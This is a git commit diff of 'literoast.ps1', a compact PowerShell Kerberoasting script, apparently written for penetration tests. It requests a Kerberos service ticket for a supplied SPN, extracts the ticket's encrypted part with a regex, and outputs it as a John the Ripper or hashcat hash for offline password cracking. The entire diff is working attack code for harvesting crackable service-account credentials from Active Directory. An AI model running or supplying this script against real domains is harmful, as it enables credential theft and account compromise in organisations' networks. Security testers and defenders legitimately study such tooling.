9e6c223a5438028eaf180bcda0f885698174932c
n0tspam <w.gordillo597@gmail.com>
2023-03-23 18:43:07 -0400

    Update literoast.ps1

--- literoast.ps1
+++ literoast.ps1
@@ -1,16 +1,31 @@
 Add-Type -AssemblyName System.IdentityModel
-
-$UserSPN = '<add your spn here>'
+$UserSPN = '<add spn here>'
+$Domain = '<client domain goes here>'
 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
 $TicketByteStream = $Ticket.GetRequest()
 $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
 if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
-                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
-                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
-                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
 
 
-                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
-                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
-                    }
-                    else {$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"}
+    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). "
+    }
+    else {$Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+    }
+}
+
+if($Hash) {
+    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe..
+    if ($OutputFormat -match 'John') {
+        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+    }
+    else {
+
+        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+        $HashFormat = "`$krb5tgs`$$($Etype)`$*$UserSPN`$$Domain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+    }
+    $hashformat
+}
